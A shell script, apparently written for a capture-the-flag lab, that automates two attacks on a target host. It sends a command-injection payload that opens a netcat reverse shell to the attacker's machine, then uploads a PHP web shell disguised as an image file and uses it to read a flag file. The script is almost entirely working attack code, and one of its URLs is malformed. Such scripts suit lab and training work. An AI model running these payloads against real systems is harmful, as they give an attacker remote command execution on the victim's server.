#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.172.22"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - COMMAND INJECTION"
xterm -hold -e "nc -lvnp 4444" &
PID=$!
curl -s -X POST http://$target_ip:8081/ -H "Content-Type: application/x-www-form-urlencoded" -d "file=;rm+-f+/tmp/f;+mkfifo+/tmp/f;+cat+/tmp/f+|+sh+-i+2>%261+|+nc+10.9.5.12+4444+>/tmp/f"

echo "2 - UNRESTRICTED FILE UPLOAD"
SHELL=webshell.png.php
echo "<?php" > $result_folder/$SHELL
echo "    system(\$_GET[\"cmd\"]);" >> $result_folder/$SHELL
echo " ?>" >> $result_folder/$SHELL
curl -s -X POST http://$target_ip:8082/index.php -F "submit=Upload Your CV" -F "fileToUpload=@$result_folder/$SHELL;type=application/octet-stream" -H "Content-Type: multipart/form-data" -o /dev/null
curl -s -X GET http:/$target_ip:8082/uploads/$SHELL?cmd=cat+/flag.txt -o $result_folder/flag.txt -o /dev/null
FLAG=$(cat $result_folder/flag.txt | grep -a -o 'THM{[^}]*}')
echo "--> User flag is '$FLAG'"

